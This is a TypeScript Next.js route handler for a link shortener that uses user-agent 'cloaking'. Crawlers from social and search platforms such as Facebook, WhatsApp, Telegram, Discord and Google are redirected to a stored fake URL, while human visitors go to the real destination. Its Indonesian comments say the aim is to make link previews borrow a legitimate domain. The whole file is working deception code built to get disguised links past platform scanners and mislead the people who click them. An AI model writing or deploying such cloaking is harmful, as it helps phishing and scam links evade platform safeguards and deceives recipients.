import { NextResponse } from 'next/server';
import { supabase } from '@/lib/supabase';

export const dynamic = 'force-dynamic';

export async function GET(
  request: Request,
  { params }: { params: { slug: string } }
) {
  const { slug } = params;

  // 1. Ambil data dari database
  const { data: urlData, error } = await supabase
    .from('urls')
    .select('*')
    .eq('slug', slug)
    .maybeSingle();

  if (error || !urlData || !urlData.original_url) {
    return NextResponse.json({ error: 'Link not found' }, { status: 404 });
  }

  // 2. Deteksi Bot Sosmed (Cloaking)
  const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';
  const isBot = /bot|facebookexternalhit|whatsapp|telegram|twitter|linkedin|skype|discord|slack|google|bing/i.test(userAgent);

  // 3. LOGIKA REDIRECT V2
  if (isBot && urlData.fake_url) {
    // Kalau BOT: Lempar ke Fake URL (Biar preview sosmed minjem domain asli)
    return Response.redirect(urlData.fake_url, 302);
  }

  // Kalau MANUSIA: Langsung lempar ke Link Tujuan (Tanpa Ads/UI)
  // Update hitcount di background (jangan ditungguin biar cepet)
  supabase.from('urls').update({ hitcount: (urlData.hitcount || 0) + 1 }).eq('id', urlData.id).then();

  return Response.redirect(urlData.original_url, 302);
}
